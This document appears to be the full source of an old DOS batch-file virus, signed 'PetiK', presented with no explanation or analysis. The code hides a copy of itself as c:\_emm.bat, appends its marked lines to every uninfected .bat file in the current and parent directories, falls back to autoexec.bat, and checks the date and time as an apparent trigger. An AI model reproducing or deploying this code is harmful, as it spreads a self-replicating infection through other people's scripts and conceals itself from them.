   ::**** HOST ****

   ::emm PetiK
   @echo off%_emm%
   if '%1=='emm goto emm%2
   set emm=%0.bat
   if not exist %emm% set emm=%0
   if '%emm%==' set emm=autoexec.bat
   if exist c:\_emm.bat goto emmg
   if not exist %emm% goto eemm
   find "emm"<%emm%>c:\_emm.bat
   attrib c:\_emm.bat +h
   :emmg
   command /e:5000 /c c:\_emm emm vir
   :eemm
   echo.|date|find "05">nul.emm
   if errorlevel 1 goto naemm
   echo.|date|find "12">nul.emm
   if errorlevel 1 goto naemm
   echo.|time|find "12">nul.emm
   if errorlevel 1 goto naemm
   echo.|time|find "00">nul.emm
   if errorlevel 1 goto naemm
   :naemm
   set emm=
   goto emmend
   :emmvir
   for %%a in (..\*.bat *.bat) do call c:\_emm emm i %%a
   exit emm
   :emmi
   find "emm"<%3>nul
   if not errorlevel 1 goto emmj
   type %3>emm$
   echo.>>emm$
   type c:\_emm.bat>>emm$
   move emm$ %3>nul
   exit emm
   :emmj
   set emm!=%emm#%1
   if %emm!%==111111111111 exit
   :emmend
